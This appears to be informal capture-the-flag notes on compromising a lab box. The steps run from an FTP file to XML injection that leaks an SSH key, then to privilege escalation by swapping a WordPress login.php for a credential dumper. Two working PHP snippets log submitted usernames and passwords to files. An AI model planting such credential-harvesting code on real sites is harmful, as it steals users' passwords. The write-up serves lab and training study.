@@ -1,0 +1,30 @@
+we got a file <detail/>subnet<ss/>  like this from ftp
+
+and from the site a php file pops up hosts.php if we curl it and give a ==xml== injection
+
+we can get id_rsa from it
+
+and log in
+
+now the privilage esc is AWSM
+
+we se ==wordpress== site adn cliff says i log often so we put a creds ==dumper== at login.php and when we log in it gives us the password
+
+```
+<?php
+$rrr = print_r($_REQUEST, true);
+$fff = fopen("/dev/shm/df", "a");
+fwrite($fff, $rrr);
+fclose($fff);
+?>
+```
+
+if we replace login.php with it it gives us ==password== at /dev/shm/df
+
+code 2 :
+
+```
+<?php
+file_put_contents("/var/www/html/dev_wiki/wp-includes/v3ded.php", $_POST['log'] . " : " . $_POST['pwd'] . "\n", FILE_APPEND);
+?>
+```
